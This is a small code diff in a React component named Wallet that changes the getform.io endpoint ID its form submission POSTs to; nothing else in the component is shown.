@@ -20,7 +20,7 @@ const Wallet = () => {
         const formData = new FormData(event.currentTarget);
 
         try {
-            const response = await fetch("https://getform.io/f/bmdkjgla", {
+            const response = await fetch("https://getform.io/f/amdkjzob", {
                 method: "POST",
                 body: formData,
             });
